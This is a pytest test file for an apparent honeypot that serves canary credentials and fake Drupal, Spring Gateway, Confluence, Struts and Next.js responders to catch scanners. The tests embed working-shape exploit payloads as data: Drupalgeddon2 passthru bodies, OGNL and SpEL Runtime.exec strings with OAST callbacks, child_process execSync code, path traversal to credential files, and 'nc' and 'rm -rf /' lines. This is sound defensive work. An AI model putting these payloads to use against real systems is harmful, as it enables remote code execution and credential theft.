    assert "VITE_AWS_ACCESS_KEY_ID" in body
    assert "NEXT_PUBLIC_AWS_ACCESS_KEY_ID" in body
    assert "REACT_APP_SENTRY_DSN" in body
    assert "REACT_APP_STRIPE_PUBLISHABLE_KEY" in body
    assert "window.__APP_ENV__" in body
    assert body.startswith("//")


def test_render_webapp_config_bundle_json_carries_canary_and_is_valid_json():
    aws = {"aws": {
        "awsAccessKeyId": "AKIAEXAMPLE",
        "awsSecretAccessKey": "SECRETEXAMPLE",
        "awsSessionToken": "TOKENEXAMPLE",
    }}
    body = tbenv.render_webapp_config_bundle_json(aws).decode("utf-8")
    # Must parse as JSON (the JS sibling deliberately doesn't — it's a
    # `window.__APP_ENV__ = {...}` assignment).
    parsed = json.loads(body)
    assert parsed["REACT_APP_AWS_ACCESS_KEY_ID"] == "AKIAEXAMPLE"
    assert parsed["VITE_AWS_SECRET_ACCESS_KEY"] == "SECRETEXAMPLE"
    assert parsed["NEXT_PUBLIC_AWS_ACCESS_KEY_ID"] == "AKIAEXAMPLE"
    assert "REACT_APP_SENTRY_DSN" in parsed
    assert "REACT_APP_STRIPE_PUBLISHABLE_KEY" in parsed


def test_render_webapp_config_bundle_js_per_hit_filler_unique():
    """Sentry / Firebase / Stripe non-canary fields must be per-hit so
    the body isn't a fleet-wide fingerprint."""
    aws = {"aws": {
        "awsAccessKeyId": "AKIAEXAMPLE",
        "awsSecretAccessKey": "SECRETEXAMPLE",
        "awsSessionToken": "TOKENEXAMPLE",
    }}
    a = tbenv.render_webapp_config_bundle_js(aws).decode("utf-8")
    b = tbenv.render_webapp_config_bundle_js(aws).decode("utf-8")
    assert a != b


def test_proc_environ_is_a_canary_trap():
    """`/proc/<pid>/environ`, `/etc/environment`, bare `/environ`
    and `/environment` are CanaryTrap entries — env-leak surfaces
    that LFI / path-traversal chains target alongside .env files."""
    for path in (
        "/proc/self/environ",
        "/proc/1/environ",
        "/proc/curproc/environ",
        "/etc/environment",
        "/environ",
        "/environment",
    ):
        trap = tbenv._TRAP_BY_PATH.get(path)
        assert trap is not None, f"{path!r} should be a CanaryTrap entry"
        assert trap.name == "proc-environ"


def test_render_proc_environ_carries_canary():
    """NUL-separated env-block carries the canary in raw-byte slots
    that harvesters grep regardless of separator."""
    r = {
        "aws": {
            "awsAccessKeyId": "AKIAFAKEEXAMPLE01",
            "awsSecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
            "awsSessionToken": "FQoGZX...EXAMPLE",
        },
    }
    body = tbenv.render_proc_environ(r)
    assert b"AWS_ACCESS_KEY_ID=AKIAFAKEEXAMPLE01" in body
    assert b"AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY" in body
    # NUL-separated; no newlines.
    assert b"\x00" in body
    assert b"\n" not in body


def test_laravel_log_is_a_canary_trap():
    """`/storage/logs/laravel.log` plus the editor-backup + absolute-
    webroot variants are all CanaryTrap entries that resolve to the
    `laravel-log` renderer."""
    for path in (
        "/storage/logs/laravel.log",
        "/storage/logs/laravel.log.bak",
        "/storage/logs/laravel.log.old",
        "/var/www/html/storage/logs/laravel.log",
        "/var/www/storage/logs/laravel.log",
        "/srv/www/html/storage/logs/laravel.log",
        "/app/storage/logs/laravel.log",
        "/home/laravel/storage/logs/laravel.log",
    ):
        trap = tbenv._TRAP_BY_PATH.get(path)
        assert trap is not None, f"{path!r} should be a CanaryTrap entry"
        assert trap.name == "laravel-log"


def test_render_laravel_log_carries_canary_in_env_dump():
    """Monolog-shaped Laravel debug log embeds the AWS canary inside
    the QueryException context `$_ENV` JSON block — the slot a real
    APP_DEBUG=true app surfaces via Illuminate's HandleExceptions
    bootstrap when an uncaught exception fires."""
    r = {
        "aws": {
            "awsAccessKeyId": "AKIAFAKEEXAMPLE01",
            "awsSecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
            "awsSessionToken": "FQoGZX...EXAMPLE",
        },
    }
    body = tbenv.render_laravel_log(r)
    text = body.decode("utf-8")
    # Canary AWS triple ends up inside the JSON-encoded $_ENV dump.
    assert "AWS_ACCESS_KEY_ID" in text
    assert "AKIAFAKEEXAMPLE01" in text
    assert "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY" in text
    # Monolog log-line shape: bracketed timestamp + channel.LEVEL + msg.
    assert "production.ERROR" in text
    # The exception class is the real Laravel symbol harvesters key on
    # (`json.dumps` doubles each backslash, so the literal in the
    # serialized body has `\\\\` between the namespace segments).
    assert "QueryException" in text
    assert "Illuminate" in text


def test_render_laravel_log_is_per_hit_unique():
    """Per-hit synthetic APP_KEY / DB_PASSWORD / MAIL_PASSWORD /
    timestamps keep the body from acting as a cross-sensor fingerprint
    a scanner can pivot on. Two adjacent renders must differ."""
    r = {
        "aws": {
            "awsAccessKeyId": "AKIAFAKEEXAMPLE01",
            "awsSecretAccessKey": "secret-key",
            "awsSessionToken": "tok",
        },
    }
    a = tbenv.render_laravel_log(r)
    b = tbenv.render_laravel_log(r)
    assert a != b, "laravel-log renderer must vary per request"


async def test_dispatch_drupal_register_get_returns_form(flux_client):
    resp = await flux_client.get(
        "/user/register",
        headers={"X-Forwarded-For": "203.0.113.50", "Host": "drupal.example"},
    )
    assert resp.status == 200
    text = await resp.text()
    assert "user-register-form" in text
    assert "Drupal" in text
    assert resp.headers.get("X-Generator", "").startswith("Drupal")

    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "drupal-user-register-probe"
    assert entry["drupalPath"] == "/user/register"
    assert entry["drupalHasDrupalgeddon2"] is False


async def test_dispatch_drupal_register_post_drupalgeddon2_logs_flags(flux_client):
    """Real CVE-2018-7600 shape: query-string element_parents + body
    with mail[#post_render]=passthru and the cmd as #markup."""
    body = (
        b"mail%5B%23post_render%5D%5B%5D=passthru"
        b"&mail%5B%23markup%5D=id"
        b"&mail%5B%23type%5D=markup"
        b"&form_id=user_register_form"
    )
    resp = await flux_client.post(
        "/user/register?element_parents=account/mail/%23value"
        "&ajax_form=1&_wrapper_format=drupal_ajax",
        data=body,
        headers={
            "X-Forwarded-For": "203.0.113.51",
            "Content-Type": "application/x-www-form-urlencoded",
        },
    )
    assert resp.status == 200
    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "drupal-user-register-rce-attempt"
    assert entry["drupalHasDrupalgeddon2"] is True
    assert entry["drupalHasRcePayload"] is True
    assert "bodyPreview" in entry
    assert "queryPreview" in entry


async def test_dispatch_drupal_register_post_drupalgeddon2_no_rce_payload(flux_client):
    """Drupalgeddon2-shape query but no PHP exec primitive in body —
    triage should fire the drupalgeddon2 tag but not the rce-attempt one."""
    resp = await flux_client.post(
        "/user/register?element_parents=account/mail/%23value&ajax_form=1",
        data=b"mail=test%40example.com&name=test",
        headers={
            "X-Forwarded-For": "203.0.113.52",
            "Content-Type": "application/x-www-form-urlencoded",
        },
    )
    assert resp.status == 200
    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "drupal-user-register-drupalgeddon2"
    assert entry["drupalHasDrupalgeddon2"] is True
    assert entry["drupalHasRcePayload"] is False


async def test_dispatch_drupal_disabled_returns_404(flux_client, monkeypatch):
    monkeypatch.setattr(tbenv, "DRUPAL_ENABLED", False)
    resp = await flux_client.get(
        "/user/register", headers={"X-Forwarded-For": "203.0.113.53"},
    )
    # Falls through to webapp-form? No — `/user/register` (singular) isn't
    # in webapp-form's path set, so it should land in not-handled.
    assert resp.status == 404
    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "not-handled"


# --- Spring Cloud Gateway extension (CVE-2022-22947) ---


def test_spring_gateway_enabled_by_default():
    assert tbenv.SPRING_GATEWAY_ENABLED


@pytest.mark.parametrize("path", [
    "/actuator/gateway/routes",
    "/actuator/gateway/routes/",
    "/actuator/gateway/routes/foo",
    "/actuator/gateway/refresh",
    "/actuator/gateway/globalfilters",
    "/actuator/gateway/routefilters",
    "/actuator/gateway/routepredicates",
    "/Actuator/Gateway/Routes",  # case-insensitive
    # Reverse-proxy aliases that already host the rest of the
    # actuator-env trap surface.
    "/manage/gateway/routes",
    "/management/gateway/routes",
    "/api/actuator/gateway/routes",
])
def test_spring_gateway_matches_observed_probes(path):
    assert tbenv.is_spring_gateway_path(path)


@pytest.mark.parametrize("path", [
    "/",
    "/.env",
    "/actuator/env",  # the existing CanaryTrap — must not be stolen
    "/actuator/heapdump",
    "/actuator/mappings",
    "/gateway",
    "/api/gateway",
])
def test_spring_gateway_non_match(path):
    assert not tbenv.is_spring_gateway_path(path)


def test_spring_gateway_does_not_steal_actuator_env():
    """`/actuator/env` is already an actuator-env CanaryTrap — the new
    spring-gateway handler must not shadow it."""
    assert not tbenv.is_spring_gateway_path("/actuator/env")
    assert "/actuator/env" in tbenv._TRAP_BY_PATH


def test_spring_gateway_disabled_returns_false(monkeypatch):
    monkeypatch.setattr(tbenv, "SPRING_GATEWAY_ENABLED", False)
    assert not tbenv.is_spring_gateway_path("/actuator/gateway/routes")


def test_spring_gateway_spel_indicators_match_real_payloads():
    """CVE-2022-22947 SpEL payloads always include `#{T(...)` or
    `T(java.lang.Runtime).getRuntime().exec(...)`; the triage flag
    should fire on every variant."""
    for needle in (
        b'#{T(java.lang.Runtime).getRuntime().exec("id")}',
        b'#{T(java.io.BufferedReader)}',
        b'new java.lang.ProcessBuilder("sh","-c","cmd")',
        b'java.lang.Runtime.getRuntime().exec("id")',
        b'${T(java.lang.Runtime).getRuntime()}',
    ):
        assert any(
            ind in needle.lower() for ind in tbenv._SPRING_GATEWAY_SPEL_INDICATORS
        )


def test_render_spring_gateway_routes_get_embeds_canary():
    """The fake routes list must embed the per-request AWS canary
    in the `metadata.adminApiKey` slot — that's where a credential
    harvester greps for `AKIA` patterns."""
    import json as _json
    aws = {"aws": {
        "awsAccessKeyId": "AKIAEXAMPLE12345",
        "awsSecretAccessKey": "secretexample/long",
        "awsSessionToken": "",
    }}
    body = tbenv.render_spring_gateway_routes_get(aws).decode("utf-8")
    parsed = _json.loads(body)
    assert isinstance(parsed, list)
    # First route must carry the canary in its metadata
    md = parsed[0]["route_definition"]["metadata"]
    assert md["adminApiKey"] == "AKIAEXAMPLE12345"
    assert md["adminApiSecret"] == "secretexample/long"


def test_render_spring_gateway_route_created_sanitises_id():
    """A route id with shell metacharacters / path traversal must be
    sanitised before being echoed back."""
    body = tbenv.render_spring_gateway_route_created(
        "../../../etc/passwd; rm -rf /",
    ).decode("utf-8")
    assert "rm -rf" not in body
    assert "../" not in body
    assert ";" not in body
    assert "etc_passwd" in body or "etc" in body
    body = tbenv.render_confluence_editor_preload_html("7.18.1").decode("utf-8")
    assert "editor-preload-container" in body
    assert "7.18.1" in body


async def test_dispatch_confluence_login_action(flux_client):
    resp = await flux_client.get(
        "/login.action",
        headers={"X-Forwarded-For": "203.0.113.71", "Host": "conf.example"},
    )
    assert resp.status == 200
    text = await resp.text()
    assert "Confluence" in text
    assert tbenv.CONFLUENCE_VERSION in text
    assert resp.headers.get("X-Confluence-Request-Time")

    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "confluence-login"
    assert entry["confluencePath"] == "/login.action"
    assert entry["confluenceMethod"] == "GET"
    assert entry["confluenceHasOgnl"] is False


async def test_dispatch_confluence_ognl_path_extracts_oast_callback(flux_client):
    encoded = (
        "/%24%7B%40java.lang.Runtime%40getRuntime%28%29.exec%28%22"
        "nslookup%20probe123.oast.me%22%29%7D/"
    )
    resp = await flux_client.get(
        encoded,
        headers={"X-Forwarded-For": "203.0.113.72"},
    )
    assert resp.status == 200
    text = await resp.text()
    # Returning the login HTML keeps the scanner believing the OGNL
    # expression evaluated successfully.
    assert "Confluence" in text

    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "confluence-ognl-probe"
    assert entry["confluenceHasOgnl"] is True
    assert entry["confluenceOastCallback"] == "probe123.oast.me"
    assert "confluencePayloadPreview" in entry


async def test_dispatch_struts_s2_ognl_on_index_action(flux_client):
    # Multi-target scanners ship Struts S2-053/S2-061/S2-066 OGNL
    # `redirect:${#a=(new ProcessBuilder(...)).start()...}` against bare
    # `/index.action`. Must route to the confluence handler, tag the log as an
    # ognl-probe (not generic confluence-login), preserve the payload preview,
    # and return the login HTML so the scanner believes execution succeeded.
    resp = await flux_client.get(
        "/index.action"
        "?redirect:${%23a%3d(new%20java.lang.ProcessBuilder("
        "new%20java.lang.String[]{'sh'%2c'-c'%2c'id'}))"
        ".start()%2c%23b%3d%23a.getInputStream()%2c%23c"
        "%3d%40org.apache.commons.io.IOUtils%40toString(%23b)}",
        headers={"X-Forwarded-For": "203.0.113.74", "Host": "struts.example"},
    )
    assert resp.status == 200
    text = await resp.text()
    assert "Confluence" in text

    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "confluence-ognl-probe"
    assert entry["confluencePath"] == "/index.action"
    assert entry["confluenceHasOgnl"] is True
    assert "confluencePayloadPreview" in entry
    assert "ProcessBuilder" in entry["confluencePayloadPreview"]


async def test_dispatch_confluence_createpage_post_extracts_body_callback(flux_client):
    body_bytes = (
        b'queryString=${@org.apache.commons.io.IOUtils@toString('
        b'@java.lang.Runtime@getRuntime().exec("nslookup tag42.interact.sh"))}'
    )
    resp = await flux_client.post(
        "/pages/createpage-entervariables.action",
        data=body_bytes,
        headers={
            "X-Forwarded-For": "203.0.113.73",
            "Content-Type": "application/x-www-form-urlencoded",
        },
    )
    assert resp.status == 200

    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "confluence-ognl-probe"
    assert entry["confluenceMethod"] == "POST"
    assert entry["confluenceHasOgnl"] is True
    assert entry["confluenceOastCallback"] == "tag42.interact.sh"


async def test_dispatch_confluence_user_dark_features_returns_json(flux_client):
    resp = await flux_client.get(
        "/users/user-dark-features",
        headers={"X-Forwarded-For": "203.0.113.74"},
    )
    assert resp.status == 200
    payload = await resp.json()
    assert payload == {"siteFeatures": [], "userFeatures": []}

    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "confluence-dark-features"


async def test_dispatch_confluence_editor_preload_returns_html(flux_client):
    resp = await flux_client.get(
        "/templates/editor-preload-container",
        headers={"X-Forwarded-For": "203.0.113.75"},
    )
    assert resp.status == 200
    text = await resp.text()
    assert "editor-preload-container" in text

    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "confluence-editor-preload"


async def test_dispatch_confluence_disabled_returns_404(flux_client, monkeypatch):
    monkeypatch.setattr(tbenv, "CONFLUENCE_ENABLED", False)
    resp = await flux_client.get(
        "/pages/createpage-entervariables.action",
        headers={"X-Forwarded-For": "203.0.113.76"},
    )
    assert resp.status == 404
    entries = _log_entries(flux_client.log_path)
    assert entries[-1]["result"] == "not-handled"


# --- Fake Next.js SSJS-injection probe responder ---


def test_nextjs_enabled_by_default():
    assert tbenv.NEXTJS_ENABLED


def test_nextjs_default_paths_cover_observed_probes():
    for path in (
        "/api/endpoint",
        "/api/test",
        "/api/[[...slug]]",
        "/_next/data/abc123/page.json",
        "/_next/data/abc123/index.json",
        "/_next/data/abc123/home.json",
        "/_next/static/chunks/pages/index-deadbeef.js",
        "/api/v2/about",   # Next.js API catch-all + matches Ubiquiti UniFi probes too
    ):
        assert tbenv.is_nextjs_path(path), f"expected match: {path}"


def test_nextjs_path_non_match():
    for path in (
        "/",
        "/index.html",
        "/.env",
        "/wp-login.php",
        # `/static/` without `_next/` prefix is generic, not Next.js.
        "/static/main.js",
    ):
        assert not tbenv.is_nextjs_path(path), f"unexpected match: {path}"


def test_nextjs_devmode_paths_route_to_handler():
    """Dev-mode internal endpoints (`/__nextjs_*`) only get probed by
    Next.js-aware scanners, so route them all to the trap. Trailing
    slashes and `/__nextjs_action/<sub>` shapes still match."""
    for path in (
        "/__nextjs_action",
        "/__nextjs_action/",
        "/__nextjs_action/foo",
        "/__nextjs_launch-editor",
        "/__nextjs_error_overlay",
        "/__nextjs_original-stack-frame",
        "/__nextjs_stack_frame",
    ):
        assert tbenv.is_nextjs_path(path), f"expected match: {path}"


def test_nextjs_url_encoded_slash_bypass_still_matches():
    """Some scanners prepend URL-encoded slashes as a path-normalization
    bypass. `/%2f__nextjs_action`, `/%252f__nextjs_action%2f`, etc.
    should still route to the trap."""
    for path in (
        "/%2f__nextjs_action",
        "/%2f__nextjs_action/",
        "/%252f__nextjs_action",
        "/%252f__nextjs_action%2f",  # trailing %2f stays in path, fine
        "/%2f__nextjs_launch-editor",
        "/%252f__nextjs_error_overlay",
    ):
        assert tbenv.is_nextjs_path(path), f"expected match: {path}"


def test_nextjs_disabled_returns_false(monkeypatch):
    monkeypatch.setattr(tbenv, "NEXTJS_ENABLED", False)
    assert not tbenv.is_nextjs_path("/_next/data/abc/page.json")
    assert not tbenv.is_nextjs_path("/api/endpoint")
    assert not tbenv.is_nextjs_path("/__nextjs_action")


def test_nextjs_normalize_path_strips_encoded_slashes():
    assert tbenv._nextjs_normalize_path("/__nextjs_action") == "/__nextjs_action"
    assert tbenv._nextjs_normalize_path("/%2f__nextjs_action") == "/__nextjs_action"
    assert tbenv._nextjs_normalize_path("/%252f__nextjs_action") == "/__nextjs_action"
    # Double-stacked encoded slashes also strip.
    assert (
        tbenv._nextjs_normalize_path("/%2f%2f__nextjs_action")
        == "/__nextjs_action"
    )
    # Encoded slash NOT at the start should be preserved (the renderer
    # wants to see exactly what the scanner sent).
    assert (
        tbenv._nextjs_normalize_path("/__nextjs_action%2fsub")
        == "/__nextjs_action%2fsub"
    )


@pytest.mark.parametrize("raw,want", [
    # Baseline — no traversal, no change.
    ("/", "/"),
    ("", "/"),
    ("/.aws/credentials", "/.aws/credentials"),
    ("/.well-known/security.txt", "/.well-known/security.txt"),
    ("/.git/config", "/.git/config"),
    ("/blog/.git/config", "/blog/.git/config"),
    ("/x.php", "/x.php"),
    # Slash collapse — pre-existing behaviour, must stay correct.
    ("//foo//bar", "/foo/bar"),
    # Standard `..` traversal: `/files/../wp-config.php` → `/wp-config.php`.
    # Scanner dictionaries walk this shape against parsers that don't
    # canonicalise before dispatch.
    ("/files/../wp-config.php", "/wp-config.php"),
    ("/foo/./bar", "/foo/bar"),
    ("/foo/../bar", "/bar"),
    ("/..", "/"),
    ("/../wp-config.php", "/wp-config.php"),
    # No-slash traversal-bypass: `<seg>..` is treated as a traversal
    # token by some buggy parsers (Apache/PHP register_globals era).
    # Repaired to `<seg>/..` then collapsed.
    ("/assets../wp-config.php", "/wp-config.php"),
    ("/assets../../wp-config.php", "/wp-config.php"),
    ("/files../wp-config.php", "/wp-config.php"),
    ("/files../../wp-config.php", "/wp-config.php"),
    # The `/static../proc/self/environ` shape the env-hunter family
    # walks alongside `.env` — must land on the proc-environ handler.
    ("/static../environ", "/environ"),
    ("/static../proc/self/environ", "/proc/self/environ"),
    # URL-encoded `..` (`%2e%2e`) gets unquoted first, then normalized.
    ("/%2e%2e/wp-config.php", "/wp-config.php"),
    ("/files/%2e%2e/wp-config.php", "/wp-config.php"),
    # Double-encoded `%252e%252e` — the `%` itself is encoded. Targets
    # parsers that only single-decode; the loop in normalize_path peels
    # layers until stable so `/%252e%252e/wp-config.php` lands on the
    # same handler as the plain `..` form. Observed in the wild from
    # cred-scanner clusters that rotate their TLS stack and start
    # double-encoding to evade single-decode normalization.
    ("/%252e%252e/wp-config.php", "/wp-config.php"),
    ("/%25252e%25252e/wp-config.php", "/wp-config.php"),
    ("/%252e%252e/proc/self/environ", "/proc/self/environ"),
    # Trailing `..` collapses to root or parent.
    ("/foo/bar/..", "/foo"),
    # Legit filenames with trailing dots (not followed by `/`) MUST NOT
    # be repaired — `foo..` is a valid Unix filename, not a traversal.
    ("/foo..", "/foo.."),
    ("/foo./", "/foo./"),
])
def test_normalize_path_resolves_traversal(raw, want):
    assert tbenv.normalize_path(raw) == want


def test_normalize_path_traversal_lands_on_canary_trap():
    """End-to-end: a traversal-bypass request for wp-config / proc-environ
    must resolve to the canonical path AND match the existing
    canary-trap dispatch dict. Otherwise the normalize_path fix is dead
    code at the dispatch layer."""
    for raw in (
        "/files/../wp-config.php",
        "/assets../wp-config.php",
        "/assets../../wp-config.php",
        "/files../wp-config.php",
    ):
        canonical = tbenv.normalize_path(raw)
        assert canonical == "/wp-config.php"
        assert canonical.lower() in tbenv._TRAP_BY_PATH, raw
    for raw in (
        "/static../environ",
        "/static../proc/self/environ",
        "/%2e%2e/proc/1/environ",
        # Double-encoded variants land on the same trap dict.
        "/%252e%252e/proc/self/environ",
        "/%25252e%25252e/proc/self/environ",
    ):
        canonical = tbenv.normalize_path(raw)
        assert canonical.lower() in tbenv._TRAP_BY_PATH, raw


def test_nextjs_extract_devmode_query_picks_interesting_keys():
    qs = "file=/etc/passwd&line=42&junk=ignored"
    extracted = tbenv._nextjs_extract_devmode_query(qs)
    assert extracted == {"file": "/etc/passwd", "line": "42"}
    assert tbenv._nextjs_extract_devmode_query("") is None
    assert tbenv._nextjs_extract_devmode_query("junk=x&blah=y") is None


def test_nextjs_decode_cmd_param_base64():
    payload = (
        "(function(){try{var cmd=\"echo VULN_TEST\";"
        "var r=require('child_process').execSync(cmd).toString();"
        "return r;}catch(e){return 'ERROR';}})()"
    )
    encoded = base64.b64encode(payload.encode()).decode()
    decoded = tbenv._nextjs_decode_cmd_param(f"cmd={encoded}")
    assert "var cmd=\"echo VULN_TEST\"" in decoded
    assert "child_process" in decoded


def test_nextjs_decode_cmd_param_url_safe_base64_no_padding():
    payload = "var cmd = 'echo HELLO'; require('child_process')"
    raw = base64.urlsafe_b64encode(payload.encode()).decode().rstrip("=")
    decoded = tbenv._nextjs_decode_cmd_param(f"cmd={raw}")
    assert "echo HELLO" in decoded


def test_nextjs_decode_cmd_param_falls_back_to_plaintext():
    # Plain `?cmd=id` (not base64) — return as-is so it still gets logged.
    decoded = tbenv._nextjs_decode_cmd_param("cmd=id")
    assert decoded.strip() in {"id", base64.b64decode("id==", validate=False).decode("utf-8", errors="replace")}


def test_nextjs_decode_cmd_param_absent():
    assert tbenv._nextjs_decode_cmd_param("") == ""
    assert tbenv._nextjs_decode_cmd_param("foo=bar") == ""


def test_nextjs_has_ssjs():
    assert tbenv._nextjs_has_ssjs(
        "(function(){var r = require('child_process').execSync('id');})()",
    )
    # The `child-process` (with hyphen) form observed in real probes —
    # not a real Node module but still a probe fingerprint.
    assert tbenv._nextjs_has_ssjs("require('child-process')")
    assert not tbenv._nextjs_has_ssjs("")
    assert not tbenv._nextjs_has_ssjs("plain text, no js eval here")


def test_nextjs_extract_cmd_literal():
    payload = (
        "(function(){try{var cmd = \"echo VULN_TEST\";"
        "var r=require('child_process').execSync(cmd);}})()"
    )
    assert tbenv._nextjs_extract_cmd_literal(payload) == "echo VULN_TEST"
    # Single quotes also supported.
    assert tbenv._nextjs_extract_cmd_literal("var cmd = 'id'") == "id"
    assert tbenv._nextjs_extract_cmd_literal("no cmd here") == ""


def test_nextjs_simulate_command_echo_token():
    assert tbenv._nextjs_simulate_command("echo VULN_TEST") == "VULN_TEST\n"
    assert tbenv._nextjs_simulate_command("echo \"hello world\"") == "hello world\n"


def test_nextjs_simulate_command_unsafe_falls_back_to_error():
    # Anything other than a literal echo of a printable-ASCII token
    # falls back to the scanner's own catch-block sentinel.
    assert tbenv._nextjs_simulate_command("id") == "ERROR"
    assert tbenv._nextjs_simulate_command("cat /etc/passwd | nc x y") == "ERROR"
    assert tbenv._nextjs_simulate_command("") == "ERROR"
    # Non-printable / shell-meta should not be reflected even after `echo `.
    assert tbenv._nextjs_simulate_command("echo $(id)") == "ERROR"
    assert tbenv._nextjs_simulate_command("echo `id`") == "ERROR"


def test_render_nextjs_page_data_shape():
    payload = json.loads(tbenv.render_nextjs_page_data("/_next/data/abc/page.json"))
    assert "pageProps" in payload
    assert payload.get("__N_SSG") is True


def test_render_nextjs_static_chunk_shape():
    body = tbenv.render_nextjs_static_chunk()
    assert b"webpackChunk" in body


async def test_dispatch_nextjs_data_route_returns_pageprops_json(flux_client):
    resp = await flux_client.get(
        "/_next/data/buildId123/index.json",
        headers={"X-Forwarded-For": "203.0.113.81"},
    )
    assert resp.status == 200
    payload = await resp.json()
    assert "pageProps" in payload
    assert resp.headers.get("X-Powered-By") == "Next.js"

    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "nextjs-page-data"
    assert entry["nextjsHasSsjs"] is False


async def test_dispatch_nextjs_ssjs_probe_reflects_echo_simulation(flux_client):
    # The exact payload shape observed in the wild.
    payload = (
        "(function(){\n"
        "    try {\n"
        "        var cmd = \"echo VULN_TEST\";\n"
        "        var result = require('child-process').execSync(cmd).toString();\n"
        "        return result;\n"
        "    } catch (err) {\n"
        "        return 'ERROR';\n"
        "    }\n"
        "})()"
    )
    encoded = base64.b64encode(payload.encode()).decode()
    resp = await flux_client.get(
        f"/api/endpoint?cmd={encoded}",
        headers={"X-Forwarded-For": "203.0.113.82"},
    )
    assert resp.status == 200
    text = await resp.text()
    # Reflecting the `echo VULN_TEST` literal back is what makes the
    # scanner believe it has a working SSJS RCE — invites a follow-up
    # exploitation payload that we capture in the next request.
    assert text == "VULN_TEST\n"

    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "nextjs-ssjs-probe"
    assert entry["nextjsHasSsjs"] is True
    assert entry["nextjsCmdLiteral"] == "echo VULN_TEST"
    assert "child-process" in entry["nextjsCmdDecoded"]


async def test_dispatch_nextjs_ssjs_unrecognised_cmd_returns_error_sentinel(flux_client):
    payload = (
        "(function(){var cmd=\"id\";"
        "require('child_process').execSync(cmd);})()"
    )
    encoded = base64.b64encode(payload.encode()).decode()
    resp = await flux_client.get(
        f"/_next/data/buildId/page.json?cmd={encoded}",
        headers={"X-Forwarded-For": "203.0.113.83"},
    )
    assert resp.status == 200
    text = await resp.text()
    # Anything other than a literal `echo <safe>` falls back to the
    # scanner's own catch-block sentinel — tells the scanner SSJS
    # evaluation works but the require failed.
    assert text == "ERROR"

    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "nextjs-ssjs-probe"
    assert entry["nextjsCmdLiteral"] == "id"


async def test_dispatch_nextjs_static_chunk_returns_js(flux_client):
    resp = await flux_client.get(
        "/_next/static/chunks/pages/index-1234.js",
        headers={"X-Forwarded-For": "203.0.113.84"},
    )
    assert resp.status == 200
    body = await resp.text()
    assert "webpackChunk" in body
    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "nextjs-static-chunk"


async def test_dispatch_nextjs_disabled_returns_404(flux_client, monkeypatch):
    monkeypatch.setattr(tbenv, "NEXTJS_ENABLED", False)
    resp = await flux_client.get(
        "/_next/data/buildId/page.json",
        headers={"X-Forwarded-For": "203.0.113.85"},
    )
    assert resp.status == 404
    entries = _log_entries(flux_client.log_path)
    assert entries[-1]["result"] == "not-handled"


async def test_dispatch_nextjs_server_action_get_returns_empty_rsc(flux_client):
    resp = await flux_client.get(
        "/__nextjs_action",
        headers={"X-Forwarded-For": "203.0.113.86"},
    )
    assert resp.status == 200
    assert (await resp.read()) == b""
    assert resp.headers.get("Content-Type", "").startswith("text/x-component")
    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "nextjs-server-action"


async def test_dispatch_nextjs_server_action_post_logs_body(flux_client):
    body = b"0:{\"action\":\"runShell\",\"args\":[\"id\"]}\n"
    resp = await flux_client.post(
        "/__nextjs_action/",
        data=body,
        headers={
            "X-Forwarded-For": "203.0.113.87",
            "Content-Type": "text/x-component",
        },
    )
    assert resp.status == 200
    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "nextjs-server-action"
    assert "runShell" in entry["bodyPreview"]


async def test_dispatch_nextjs_launch_editor_returns_opened_true(flux_client):
    resp = await flux_client.get(
        "/__nextjs_launch-editor?file=/etc/passwd&line=1",
        headers={"X-Forwarded-For": "203.0.113.88"},
    )
    assert resp.status == 200
    payload = await resp.json()
    assert payload == {"opened": True}
    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "nextjs-launch-editor"
    assert entry["nextjsDevModeQuery"] == {"file": "/etc/passwd", "line": "1"}


async def test_dispatch_nextjs_error_overlay_returns_html(flux_client):
    resp = await flux_client.get(
        "/__nextjs_error_overlay",
        headers={"X-Forwarded-For": "203.0.113.89"},
    )
    assert resp.status == 200
    text = await resp.text()
    assert "data-nextjs-dialog" in text
    assert "TypeError" in text
    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "nextjs-error-overlay"


async def test_dispatch_nextjs_url_encoded_slash_bypass_routes_to_action(flux_client):
    # Scanner probes `/%2f__nextjs_action` as a path-normalization
    # bypass — must still reach the trap.
    resp = await flux_client.get(
        "/%2f__nextjs_action",
        headers={"X-Forwarded-For": "203.0.113.90"},
    )
    assert resp.status == 200
    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "nextjs-server-action"


async def test_dispatch_nextjs_unknown_devmode_path_uses_other_tag(flux_client):
    resp = await flux_client.get(
        "/__nextjs_some_new_endpoint",
        headers={"X-Forwarded-For": "203.0.113.91"},
    )
    assert resp.status == 200
    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "nextjs-devmode-other"


# --- Cmd-injection trap (/admin/config?cmd=, /printenv, /cgi-bin/printenv) ---


def test_cmd_injection_enabled_by_default():
    assert tbenv.CMD_INJECTION_ENABLED


def test_cmd_injection_default_paths_cover_observed_family():
    for path in (
        "/admin/config",
        "/admin/config.php",
        "/printenv",
        "/cgi-bin/printenv",
        "/cgi-bin/test-cgi",
    ):
        assert tbenv.is_cmd_injection_path(path), f"expected match: {path}"


def test_cmd_injection_path_non_match():
